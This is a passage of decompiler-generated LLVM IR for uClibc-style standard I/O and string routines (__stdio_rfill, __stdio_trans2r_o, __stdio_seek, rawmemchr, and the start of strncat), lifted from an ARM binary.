dec_label_pc_1996c:                               ; preds = %dec_label_pc_19964
  %v1_1996c = and i32 %v4_19950, 2048
  %v2_1996c = icmp eq i32 %v1_1996c, 0
  br i1 %v2_1996c, label %.thread, label %dec_label_pc_19974

dec_label_pc_19974:                               ; preds = %dec_label_pc_1996c
  %v8_19978 = icmp sgt i32 %v1_19964, 1
  br i1 %v8_19978, label %dec_label_pc_19a04, label %dec_label_pc_1997c

dec_label_pc_1997c:                               ; preds = %dec_label_pc_19974
  %v2_1997c = add i32 %tmp, 40
  %v3_1997c = inttoptr i32 %v2_1997c to i32*
  %v4_1997c = load i32, i32* %v3_1997c, align 4
  %v2_19980 = icmp eq i32 %v4_1997c, 0
  br i1 %v2_19980, label %dec_label_pc_19988, label %dec_label_pc_19a04

dec_label_pc_19988:                               ; preds = %dec_label_pc_1997c
  %v2_19988 = add i32 %tmp, 3
  %v3_19988 = inttoptr i32 %v2_19988 to i8*
  %v4_19988 = load i8, i8* %v3_19988, align 1
  %v5_19988 = zext i8 %v4_19988 to i32
  %v2_1998c = add i32 %tmp, 44
  %v3_1998c = inttoptr i32 %v2_1998c to i32*
  %v4_1998c = load i32, i32* %v3_1998c, align 4
  store i32 %v4_1998c, i32* %r2.global-to-local, align 4
  %v2_19990 = sub nsw i32 %v1_19964, %v5_19988
  %v1_19998 = add nsw i32 %v2_19990, -1
  %tmp11 = icmp slt i32 %v4_1998c, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_19988
  %v7_1999c = add i32 %tmp, 2
  %v8_1999c = inttoptr i32 %v7_1999c to i8*
  %v9_1999c = load i8, i8* %v8_1999c, align 1
  %v10_1999c = zext i8 %v9_1999c to i32
  %v7_199a0 = sub nsw i32 %v1_19998, %v10_1999c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_19988, %bb, %dec_label_pc_1996c, %dec_label_pc_19964, %bb12
  %v0_199bc = phi i32 [ %v1_19964, %dec_label_pc_1996c ], [ %v1_19964, %dec_label_pc_19964 ], [ 0, %bb ], [ %v7_199a0, %bb12 ], [ %v1_19998, %dec_label_pc_19988 ]
  %v1_199a4 = and i32 %v4_1994c, 64
  %v2_199a4 = icmp eq i32 %v1_199a4, 0
  %storemerge.in.in.v = select i1 %v2_199a4, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_199b0 = add i32 %tmp, 16
  %v3_199b0 = inttoptr i32 %v2_199b0 to i32*
  %v4_199b0 = load i32, i32* %v3_199b0, align 4
  %v2_199b4 = sub i32 %storemerge, %v4_199b0
  %v1_199b8 = inttoptr i32 %arg2 to i32*
  %v2_199b8 = load i32, i32* %v1_199b8, align 4
  store i32 %v2_199b8, i32* %r1.global-to-local, align 4
  %v3_199b8 = add i32 %arg2, 4
  %v4_199b8 = inttoptr i32 %v3_199b8 to i32*
  %v5_199b8 = load i32, i32* %v4_199b8, align 4
  store i32 %v5_199b8, i32* %r2.global-to-local, align 4
  %v2_199bc = add i32 %v2_199b4, %v0_199bc
  store i32 %v2_199bc, i32* %r5.global-to-local, align 4
  %v2_199c0 = sub i32 %v2_199b8, %v2_199bc
  %v2_199c4 = and i32 %v2_199bc, 1073741824
  %v3_199c4 = icmp ne i32 %v2_199c4, 0
  %v6_199c4 = icmp eq i1 %v3_199c4, false
  %tmp16 = icmp slt i32 %v2_199bc, 0
  %v4_199c4.neg = zext i1 %tmp16 to i32
  %v7_199c4 = add i32 %v5_199b8, %v4_199c4.neg
  %v9_199c4 = sext i1 %v6_199c4 to i32
  %v10_199c4 = add i32 %v7_199c4, %v9_199c4
  store i32 %v10_199c4, i32* %r4.global-to-local, align 4
  store i32 %v2_199c0, i32* %v1_199b8, align 4
  %v5_199c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_199c8, i32* %v4_199b8, align 4
  %v0_199cc = load i32, i32* %r6.global-to-local, align 4
  %v1_199cc = add i32 %v0_199cc, 4
  %v2_199cc = inttoptr i32 %v1_199cc to i32*
  %v3_199cc = load i32, i32* %v2_199cc, align 4
  %v1_199d0 = load i32, i32* %r2.global-to-local, align 4
  %v8_199d4 = icmp sgt i32 %v3_199cc, %v1_199d0
  br i1 %v8_199d4, label %dec_label_pc_199e8, label %dec_label_pc_199d8

dec_label_pc_199d8:                               ; preds = %.thread
  %v9_199d0 = icmp eq i32 %v3_199cc, %v1_199d0
  br i1 %v9_199d0, label %dec_label_pc_199dc, label %dec_label_pc_199ecthread-pre-split

dec_label_pc_199dc:                               ; preds = %dec_label_pc_199d8
  %v1_199dc = inttoptr i32 %v0_199cc to i32*
  %v2_199dc = load i32, i32* %v1_199dc, align 4
  %v1_199e0 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_199dc, %v1_199e0
  br i1 %tmp17, label %dec_label_pc_199e8, label %dec_label_pc_199ecthread-pre-split

dec_label_pc_199e8:                               ; preds = %dec_label_pc_199dc, %.thread
  %v0_199e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_199e8 = sub i32 0, %v0_199e8
  store i32 %v1_199e8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_199ec

dec_label_pc_199ecthread-pre-split:               ; preds = %dec_label_pc_199dc, %dec_label_pc_199d8
  %v0_199ec.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_199ec

dec_label_pc_199ec:                               ; preds = %dec_label_pc_199ecthread-pre-split, %dec_label_pc_199e8
  %v0_199ec = phi i32 [ %v0_199ec.pr, %dec_label_pc_199ecthread-pre-split ], [ %v1_199e8, %dec_label_pc_199e8 ]
  %v1_199ec = icmp slt i32 %v0_199ec, 0
  br i1 %v1_199ec, label %dec_label_pc_199f4, label %dec_label_pc_19a08

dec_label_pc_199f4:                               ; preds = %dec_label_pc_199ec
  %v0_199f4 = call i32 @__errno_location()
  %v2_199fc = inttoptr i32 %v0_199f4 to i32*
  store i32 75, i32* %v2_199fc, align 4
  %v0_19a08.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19a08

dec_label_pc_19a04:                               ; preds = %dec_label_pc_1997c, %dec_label_pc_19974
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19a08

dec_label_pc_19a08:                               ; preds = %dec_label_pc_199ec, %dec_label_pc_199f4, %dec_label_pc_19a04
  %v0_19a08 = phi i32 [ %v0_199ec, %dec_label_pc_199ec ], [ %v0_19a08.pre, %dec_label_pc_199f4 ], [ -1, %dec_label_pc_19a04 ]
  %v2_19a0c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19a0c, i32* @r4, align 4
  ret i32 %v0_19a08

; uselistorder directives
  uselistorder i32 %v1_199d0, { 1, 0 }
  uselistorder i32 %v3_199cc, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_1994c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 4, 3, 1, 2, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 1073741824, { 2, 3, 0, 1 }
  uselistorder i32 2048, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19a08, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19a10 = load i32, i32* @r4, align 4
  store i32 %v3_19a10, i32* %stack_var_-8, align 4
  %v1_19a14 = add i32 %arg1, 8
  %v1_19a18 = inttoptr i32 %v1_19a14 to i32*
  %v2_19a18 = load i32, i32* %v1_19a18, align 4
  store i32 %v2_19a18, i32* @r1, align 4
  %v3_19a18 = add i32 %arg1, 12
  %v4_19a18 = inttoptr i32 %v3_19a18 to i32*
  %v5_19a18 = load i32, i32* %v4_19a18, align 4
  %v2_19a1c = sub i32 %v5_19a18, %v2_19a18
  store i32 %v2_19a1c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_19a24 = inttoptr i32 %arg1 to i8*
  %v4_19a24 = call i32 @__stdio_READ(i8* %v3_19a24, i32 %v2_19a18, i32 %v2_19a1c)
  %v0_19a28 = load i32, i32* @r4, align 4
  %v1_19a28 = add i32 %v0_19a28, 8
  %v2_19a28 = inttoptr i32 %v1_19a28 to i32*
  %v3_19a28 = load i32, i32* %v2_19a28, align 4
  store i32 %v3_19a28, i32* %r2.global-to-local, align 4
  %v2_19a2c = add i32 %v3_19a28, %v4_19a24
  %v2_19a30 = add i32 %v0_19a28, 20
  %v3_19a30 = inttoptr i32 %v2_19a30 to i32*
  store i32 %v2_19a2c, i32* %v3_19a30, align 4
  %v0_19a34 = load i32, i32* %r2.global-to-local, align 4
  %v1_19a34 = load i32, i32* @r4, align 4
  %v2_19a34 = add i32 %v1_19a34, 16
  %v3_19a34 = inttoptr i32 %v2_19a34 to i32*
  store i32 %v0_19a34, i32* %v3_19a34, align 4
  %v2_19a38 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19a38, i32* @r4, align 4
  ret i32 %v4_19a24

; uselistorder directives
  uselistorder i32 %v4_19a24, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19a3c = load i32, i32* @r4, align 4
  store i32 %v3_19a3c, i32* %stack_var_-12, align 4
  %v0_19a40 = load i32, i32* @r0, align 4
  %v1_19a40 = inttoptr i32 %v0_19a40 to i8*
  %v2_19a40 = load i8, i8* %v1_19a40, align 1
  %v3_19a40 = zext i8 %v2_19a40 to i32
  store i32 %v3_19a40, i32* %r2.global-to-local, align 4
  %v1_19a44 = add i32 %v0_19a40, 1
  %v2_19a44 = inttoptr i32 %v1_19a44 to i8*
  %v3_19a44 = load i8, i8* %v2_19a44, align 1
  %v4_19a44 = zext i8 %v3_19a44 to i32
  store i32 %v4_19a44, i32* %r3.global-to-local, align 4
  %v4_19a48 = mul nuw nsw i32 %v4_19a44, 256
  %v5_19a48 = or i32 %v4_19a48, %v3_19a40
  store i32 %v5_19a48, i32* %r2.global-to-local, align 4
  %v1_19a4c = load i32, i32* @r1, align 4
  %v2_19a4c = and i32 %v1_19a4c, %v5_19a48
  %v4_19a4c = icmp eq i32 %v2_19a4c, 0
  store i32 %v0_19a40, i32* @r4, align 4
  br i1 %v4_19a4c, label %dec_label_pc_19a58, label %dec_label_pc_19a70

dec_label_pc_19a58:                               ; preds = %entry
  %v1_19a58 = and i32 %v5_19a48, 2176
  %v2_19a58 = icmp eq i32 %v1_19a58, 0
  br i1 %v2_19a58, label %dec_label_pc_19a60, label %dec_label_pc_19a84

dec_label_pc_19a60:                               ; preds = %dec_label_pc_19a58
  %v2_19a60 = or i32 %v1_19a4c, %v5_19a48
  store i32 %v2_19a60, i32* %r2.global-to-local, align 4
  %v3_19a64 = sdiv i32 %v2_19a60, 256
  store i32 %v3_19a64, i32* %r3.global-to-local, align 4
  %v1_19a68 = trunc i32 %v3_19a64 to i8
  store i8 %v1_19a68, i8* %v2_19a44, align 1
  %v0_19a6c = load i32, i32* %r2.global-to-local, align 4
  %v1_19a6c = trunc i32 %v0_19a6c to i8
  %v2_19a6c = load i32, i32* @r0, align 4
  %v3_19a6c = inttoptr i32 %v2_19a6c to i8*
  store i8 %v1_19a6c, i8* %v3_19a6c, align 1
  %v0_19a70.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19a70

dec_label_pc_19a70:                               ; preds = %entry, %dec_label_pc_19a60
  %v0_19a70 = phi i32 [ %v0_19a40, %entry ], [ %v0_19a70.pre, %dec_label_pc_19a60 ]
  %v1_19a70 = inttoptr i32 %v0_19a70 to i8*
  %v2_19a70 = load i8, i8* %v1_19a70, align 1
  %v3_19a70 = zext i8 %v2_19a70 to i32
  store i32 %v3_19a70, i32* %r2.global-to-local, align 4
  %v1_19a74 = add i32 %v0_19a70, 1
  %v2_19a74 = inttoptr i32 %v1_19a74 to i8*
  %v3_19a74 = load i8, i8* %v2_19a74, align 1
  %v4_19a74 = zext i8 %v3_19a74 to i32
  %v4_19a78 = mul nuw nsw i32 %v4_19a74, 256
  %v5_19a78 = or i32 %v4_19a78, %v3_19a70
  store i32 %v5_19a78, i32* %r3.global-to-local, align 4
  %v1_19a7c = and i32 %v3_19a70, 16
  store i32 %v1_19a7c, i32* %r5.global-to-local, align 4
  %v2_19a7c = icmp eq i32 %v1_19a7c, 0
  br i1 %v2_19a7c, label %dec_label_pc_19aac, label %dec_label_pc_19a84

dec_label_pc_19a84:                               ; preds = %dec_label_pc_19a58, %dec_label_pc_19a70
  %v0_19a84 = call i32 @__errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_19a8c = inttoptr i32 %v0_19a84 to i32*
  store i32 9, i32* %v2_19a8c, align 4
  br label %dec_label_pc_19a90

dec_label_pc_19a90:                               ; preds = %dec_label_pc_19ab4, %dec_label_pc_19a84
  %v0_19a90 = load i32, i32* @r4, align 4
  %v1_19a90 = inttoptr i32 %v0_19a90 to i32*
  %v2_19a90 = load i32, i32* %v1_19a90, align 4
  %v1_19a94 = or i32 %v2_19a90, 8
  store i32 %v1_19a94, i32* %r3.global-to-local, align 4
  %v3_19a98 = sdiv i32 %v2_19a90, 256
  store i32 %v3_19a98, i32* %r2.global-to-local, align 4
  %v1_19aa0 = trunc i32 %v3_19a98 to i8
  %v3_19aa0 = add i32 %v0_19a90, 1
  %v4_19aa0 = inttoptr i32 %v3_19aa0 to i8*
  store i8 %v1_19aa0, i8* %v4_19aa0, align 1
  %v0_19aa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_19aa4 = trunc i32 %v0_19aa4 to i8
  %v2_19aa4 = load i32, i32* @r4, align 4
  %v3_19aa4 = inttoptr i32 %v2_19aa4 to i8*
  store i8 %v1_19aa4, i8* %v3_19aa4, align 1
  %v2_19aa8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19aa8, i32* @r4, align 4
  ret i32 -1

dec_label_pc_19aac:                               ; preds = %dec_label_pc_19a70
  %v1_19aac = and i32 %v3_19a70, 64
  %v2_19aac = icmp eq i32 %v1_19aac, 0
  br i1 %v2_19aac, label %dec_label_pc_19adc, label %dec_label_pc_19ab4

dec_label_pc_19ab4:                               ; preds = %dec_label_pc_19aac
  %v0_19ab4 = call i32 @__stdio_wcommit()
  %v2_19ab8 = icmp eq i32 %v0_19ab4, 0
  br i1 %v2_19ab8, label %dec_label_pc_19ac0, label %dec_label_pc_19a90

dec_label_pc_19ac0:                               ; preds = %dec_label_pc_19ab4
  %v0_19ac0 = load i32, i32* @r4, align 4
  %v1_19ac0 = inttoptr i32 %v0_19ac0 to i32*
  %v2_19ac0 = load i32, i32* %v1_19ac0, align 4
  store i32 %v2_19ac0, i32* %r3.global-to-local, align 4
  %v1_19ac4 = add i32 %v0_19ac0, 8
  %v2_19ac4 = inttoptr i32 %v1_19ac4 to i32*
  %v3_19ac4 = load i32, i32* %v2_19ac4, align 4
  store i32 %v3_19ac4, i32* %r2.global-to-local, align 4
  %v1_19ac8 = and i32 %v2_19ac0, -65
  store i32 %v1_19ac8, i32* %r3.global-to-local, align 4
  %v3_19acc = sdiv i32 %v2_19ac0, 256
  store i32 %v3_19acc, i32* %r1.global-to-local, align 4
  %v2_19ad0 = add i32 %v0_19ac0, 28
  %v3_19ad0 = inttoptr i32 %v2_19ad0 to i32*
  store i32 %v3_19ac4, i32* %v3_19ad0, align 4
  %v0_19ad4 = load i32, i32* %r1.global-to-local, align 4
  %v1_19ad4 = trunc i32 %v0_19ad4 to i8
  %v2_19ad4 = load i32, i32* @r4, align 4
  %v3_19ad4 = add i32 %v2_19ad4, 1
  %v4_19ad4 = inttoptr i32 %v3_19ad4 to i8*
  store i8 %v1_19ad4, i8* %v4_19ad4, align 1
  %v0_19ad8 = load i32, i32* %r3.global-to-local, align 4
  %v1_19ad8 = trunc i32 %v0_19ad8 to i8
  %v2_19ad8 = load i32, i32* @r4, align 4
  %v3_19ad8 = inttoptr i32 %v2_19ad8 to i8*
  store i8 %v1_19ad8, i8* %v3_19ad8, align 1
  %v0_19adc.pre = load i32, i32* @r4, align 4
  %v0_19ae8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19adc

dec_label_pc_19adc:                               ; preds = %dec_label_pc_19aac, %dec_label_pc_19ac0
  %v0_19ae8 = phi i32 [ 0, %dec_label_pc_19aac ], [ %v0_19ae8.pre, %dec_label_pc_19ac0 ]
  %v2_19aec = phi i32 [ %v0_19a70, %dec_label_pc_19aac ], [ %v0_19adc.pre, %dec_label_pc_19ac0 ]
  %v1_19adc = inttoptr i32 %v2_19aec to i32*
  %v2_19adc = load i32, i32* %v1_19adc, align 4
  %v1_19ae0 = or i32 %v2_19adc, 1
  store i32 %v1_19ae0, i32* %r3.global-to-local, align 4
  %v3_19ae4 = sdiv i32 %v2_19adc, 256
  store i32 %v3_19ae4, i32* %r2.global-to-local, align 4
  %v1_19aec = trunc i32 %v3_19ae4 to i8
  %v3_19aec = add i32 %v2_19aec, 1
  %v4_19aec = inttoptr i32 %v3_19aec to i8*
  store i8 %v1_19aec, i8* %v4_19aec, align 1
  %v0_19af0 = load i32, i32* %r3.global-to-local, align 4
  %v1_19af0 = trunc i32 %v0_19af0 to i8
  %v2_19af0 = load i32, i32* @r4, align 4
  %v3_19af0 = inttoptr i32 %v2_19af0 to i8*
  store i8 %v1_19af0, i8* %v3_19af0, align 1
  %v2_19af4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19af4, i32* @r4, align 4
  ret i32 %v0_19ae8

; uselistorder directives
  uselistorder i32 %v3_19ae4, { 1, 0 }
  uselistorder i32 %v3_19a98, { 1, 0 }
  uselistorder i32 %v3_19a70, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19a70, { 0, 2, 1 }
  uselistorder i32 %v3_19a64, { 1, 0 }
  uselistorder i32 %v5_19a48, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__stdio_wcommit, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_19adc, { 1, 0 }
  uselistorder label %dec_label_pc_19a84, { 1, 0 }
  uselistorder label %dec_label_pc_19a70, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_19afc = load i32, i32* @r4, align 4
  %v6_19afc = load i32, i32* @lr, align 4
  %v1_19b00 = add i32 %arg1, 4
  %v2_19b00 = inttoptr i32 %v1_19b00 to i32*
  %v3_19b00 = load i32, i32* %v2_19b00, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_19b08 = load i32, i32* %arg2, align 4
  %v3_19b08 = add i32 %tmp, 4
  %v4_19b08 = inttoptr i32 %v3_19b08 to i32*
  %v5_19b08 = load i32, i32* %v4_19b08, align 4
  %v6_19b0c = call i32 @__libc_lseek64(i32 %v3_19b00, i32 %v2_19b08, i32 %v5_19b08, i32 %arg3, i32 %v3_19afc, i32 %v6_19afc)
  %v1_19b10 = icmp slt i32 %v2_19b08, 0
  %v6_19b0c. = select i1 %v1_19b10, i32 %v6_19b0c, i32 0
  store i32 %v6_19b0c., i32* %r3.global-to-local, align 4
  br i1 %v1_19b10, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_19b1c = load i32, i32* @r4, align 4
  %v4_19b1c = inttoptr i32 %v3_19b1c to i32*
  store i32 %v6_19b0c, i32* %v4_19b1c, align 4
  %v6_19b1c = add i32 %v3_19b1c, 4
  %v7_19b1c = inttoptr i32 %v6_19b1c to i32*
  store i32 %v2_19b08, i32* %v7_19b1c, align 4
  %v0_19b20.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v0_19b20 = phi i32 [ %v6_19b0c, %entry ], [ %v0_19b20.pre, %bb ]
  ret i32 %v0_19b20

; uselistorder directives
  uselistorder i32 %v6_19b0c, { 0, 2, 1 }
  uselistorder i32 %v2_19b08, { 1, 2, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_19b4c:
  %v1_19b2c = urem i32 %arg1, 256
  store i32 %v1_19b2c, i32* @lr, align 4
  %v4_19b4c = mul nuw nsw i32 %v1_19b2c, 256
  %v5_19b4c = or i32 %v4_19b4c, %v1_19b2c
  %v4_19b54 = mul i32 %v5_19b4c, 65536
  %v5_19b54 = or i32 %v4_19b54, %v5_19b4c
  %v0_19b58.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_19b58

dec_label_pc_19b58:                               ; preds = %dec_label_pc_19bc4, %dec_label_pc_19b58, %dec_label_pc_19b4c
  %v0_19b58 = phi i32 [ %v0_19b58.pre, %dec_label_pc_19b4c ], [ %v4_19b58, %dec_label_pc_19b58 ], [ %v4_19b58, %dec_label_pc_19bc4 ]
  %v1_19b58 = inttoptr i32 %v0_19b58 to i32*
  %v2_19b58 = load i32, i32* %v1_19b58, align 4
  %v4_19b58 = add i32 %v0_19b58, 4
  store i32 %v4_19b58, i32* @ip, align 4
  %v2_19b60 = xor i32 %v2_19b58, %v5_19b54
  %v2_19b64 = add i32 %v2_19b60, 2130640639
  %v1_19b6c = sub i32 -1, %v2_19b60
  %v2_19b70 = xor i32 %v2_19b64, %v1_19b6c
  %v2_19b74 = and i32 %v2_19b70, -2130640640
  %v2_19b78 = icmp eq i32 %v2_19b74, 0
  br i1 %v2_19b78, label %dec_label_pc_19b58, label %dec_label_pc_19b80

dec_label_pc_19b80:                               ; preds = %dec_label_pc_19b58
  %v2_19b80 = inttoptr i32 %v0_19b58 to i8*
  %v3_19b80 = load i8, i8* %v2_19b80, align 1
  %v4_19b80 = zext i8 %v3_19b80 to i32
  %v9_19b88 = icmp eq i32 %v4_19b80, %v1_19b2c
  store i1 %v9_19b88, i1* @cpsr_z, align 1
  %v1_19b8c = add i32 %v0_19b58, 3
  %v1_19b90 = add i32 %v0_19b58, 1
  store i32 %v1_19b90, i32* @r2, align 4
  %v1_19b94 = add i32 %v0_19b58, 2
  br i1 %v9_19b88, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_19b80
  ret i32 %v0_19b58

bb18:                                             ; preds = %dec_label_pc_19b80
  %v2_19b9c = inttoptr i32 %v1_19b90 to i8*
  %v3_19b9c = load i8, i8* %v2_19b9c, align 1
  %v4_19b9c = zext i8 %v3_19b9c to i32
  %v9_19ba0 = icmp eq i32 %v4_19b9c, %v1_19b2c
  store i1 %v9_19ba0, i1* @cpsr_z, align 1
  br i1 %v9_19ba0, label %dec_label_pc_19ba8, label %dec_label_pc_19bb0

dec_label_pc_19ba8:                               ; preds = %bb18
  ret i32 %v1_19b90

dec_label_pc_19bb0:                               ; preds = %bb18
  %v2_19bb0 = inttoptr i32 %v1_19b94 to i8*
  %v3_19bb0 = load i8, i8* %v2_19bb0, align 1
  %v4_19bb0 = zext i8 %v3_19bb0 to i32
  %v9_19bb4 = icmp eq i32 %v4_19bb0, %v1_19b2c
  store i1 %v9_19bb4, i1* @cpsr_z, align 1
  br i1 %v9_19bb4, label %dec_label_pc_19bbc, label %dec_label_pc_19bc4

dec_label_pc_19bbc:                               ; preds = %dec_label_pc_19bb0
  ret i32 %v1_19b94

dec_label_pc_19bc4:                               ; preds = %dec_label_pc_19bb0
  %v2_19bc4 = inttoptr i32 %v1_19b8c to i8*
  %v3_19bc4 = load i8, i8* %v2_19bc4, align 1
  %v4_19bc4 = zext i8 %v3_19bc4 to i32
  %v9_19bc8 = icmp eq i32 %v4_19bc4, %v1_19b2c
  store i1 %v9_19bc8, i1* @cpsr_z, align 1
  br i1 %v9_19bc8, label %dec_label_pc_19bd0, label %dec_label_pc_19b58

dec_label_pc_19bd0:                               ; preds = %dec_label_pc_19bc4
  ret i32 %v1_19b8c

; uselistorder directives
  uselistorder i32 %v4_19b58, { 2, 1, 0 }
  uselistorder i32 %v0_19b58, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_19b4c, { 1, 0 }
  uselistorder i32 %v1_19b2c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i1* @cpsr_z, { 8, 9, 10, 11, 1, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 0, 2, 3, 14, 4, 5, 6, 7, 23 }
  uselistorder i32 -2130640640, { 6, 7, 2, 0, 8, 3, 1, 4, 5 }
  uselistorder i32 2130640639, { 4, 0, 1, 2, 3 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19be0 = load i32, i32* @r4, align 4
  store i32 %v3_19be0, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19bec

dec_label_pc_19bec:                               ; preds = %dec_label_pc_19bec, %entry
  %v0_19bec = phi i32 [ %v5_19bec, %dec_label_pc_19bec ], [ %tmp, %entry ]
  %v1_19bec = inttoptr i32 %v0_19bec to i8*
  %v2_19bec = load i8, i8* %v1_19bec, align 1
  %v3_19bec = zext i8 %v2_19bec to i32
  store i32 %v3_19bec, i32* %ip.global-to-local, align 4
  %v5_19bec = add i32 %v0_19bec, 1
  store i32 %v5_19bec, i32* %r3.global-to-local, align 4
  %v2_19bf0 = icmp eq i8 %v2_19bec, 0
  store i1 %v2_19bf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19bf0, label %dec_label_pc_19bf8, label %dec_label_pc_19bec

dec_label_pc_19bf8:                               ; preds = %dec_label_pc_19bec
  %v0_19bf8 = load i32, i32* %r2.global-to-local, align 4
  %v7_19bf8 = icmp eq i32 %v0_19bf8, 3
  store i1 %v7_19bf8, i1* %cpsr_z.global-to-local, align 1
  %v1_19bfc = add i32 %v0_19bec, -1
  store i32 %v1_19bfc, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_19bf8, 4
  br i1 %tmp10, label %dec_label_pc_19c90thread-pre-split, label %dec_label_pc_19c04

dec_label_pc_19c04:                               ; preds = %dec_label_pc_19bf8
  %v3_19c04 = udiv i32 %v0_19bf8, 4
  store i32 %v3_19c04, i32* %r0.global-to-local, align 4
  %v0_19c08.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_19c08

dec_label_pc_19c08:                               ; preds = %dec_label_pc_19c68, %dec_label_pc_19c04
  %v2_19c10 = phi i32 [ %v1_19c60, %dec_label_pc_19c68 ], [ %v1_19bfc, %dec_label_pc_19c04 ]
  %v0_19c08 = phi i32 [ %v1_19c5c, %dec_label_pc_19c68 ], [ %v0_19c08.pre, %dec_label_pc_19c04 ]
  %v1_19c08 = inttoptr i32 %v0_19c08 to i8*
  %v2_19c08 = load i8, i8* %v1_19c08, align 1
  %v3_19c08 = zext i8 %v2_19c08 to i32
  store i32 %v3_19c08, i32* %r3.global-to-local, align 4
  %v2_19c0c = icmp eq i8 %v2_19c08, 0
  store i1 %v2_19c0c, i1* %cpsr_z.global-to-local, align 1
  %v3_19c10 = add i32 %v2_19c10, 1
  %v4_19c10 = inttoptr i32 %v3_19c10 to i8*
  store i8 %v2_19c08, i8* %v4_19c10, align 1
  %v0_19c14 = load i32, i32* %lr.global-to-local, align 4
  %v1_19c14 = add i32 %v0_19c14, 1
  store i32 %v1_19c14, i32* %ip.global-to-local, align 4
  %v0_19c18 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19c18, label %.loopexit, label %dec_label_pc_19c1c

dec_label_pc_19c1c:                               ; preds = %dec_label_pc_19c08
  %v0_19c1c = load i32, i32* @r1, align 4
  %v1_19c1c = add i32 %v0_19c1c, 1
  %v2_19c1c = inttoptr i32 %v1_19c1c to i8*
  %v3_19c1c = load i8, i8* %v2_19c1c, align 1
  %v4_19c1c = zext i8 %v3_19c1c to i32
  store i32 %v4_19c1c, i32* %r3.global-to-local, align 4
  %v2_19c20 = icmp eq i8 %v3_19c1c, 0
  store i1 %v2_19c20, i1* %cpsr_z.global-to-local, align 1
  %v3_19c24 = add i32 %v0_19c14, 2
